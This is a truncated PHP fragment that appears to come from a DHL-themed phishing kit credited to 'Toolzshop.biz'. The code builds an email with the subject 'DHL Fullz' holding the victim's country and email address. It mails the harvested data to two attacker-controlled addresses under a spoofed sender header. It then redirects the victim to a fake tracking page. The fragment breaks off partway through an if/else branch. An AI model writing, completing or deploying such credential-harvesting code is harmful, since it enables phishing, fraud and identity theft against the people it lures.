...
$message .= "--+ Created BY Toolzshop.biz in 2015 +---\n";

$send = "veepet6@gmail.com, hk.blaze@yandex.com";

$subject = "DHL Fullz | $country | $email";
$headers .= "MIME-Version: 1.0\n";
$headers .= $_POST['eMailAdd']."\n";
$headers = "From: John De Fisher <new@cpanel.com>\n";
...
if ($passerr==0)
{
header("Location: tracking.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid=$email");
}
else
{
